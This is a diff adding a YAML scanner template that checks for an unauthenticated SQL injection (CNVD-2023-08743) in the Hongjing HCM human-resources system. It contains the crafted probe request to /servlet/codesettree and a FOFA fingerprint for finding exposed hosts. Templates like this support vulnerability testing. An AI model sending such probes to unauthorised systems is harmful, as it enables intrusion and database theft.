@@ -1,0 +1,20 @@
+id: hjsoft-hcm-sql-injection
+
+info:
+  name: hjsoft-hcm-SQL-injection
+  author: oxsonder
+  severity: high
+  verified: true
+  description: |
+    宏景人力系统 存在SQL注入漏洞(CNVD-2023-08743)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。
+    FOFA: body='<div class="hj-hy-all-one-logo"'
+  reference:
+    - https://mp.weixin.qq.com/s/NhJe4MUepwqc6SmDJw4aow
+    
+rules:
+  r0:
+    request:
+      method: GET
+      path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31
+    expression: response.status == 200 && response.body.bcontains(b'TreeNode id=')
+expression: r0()
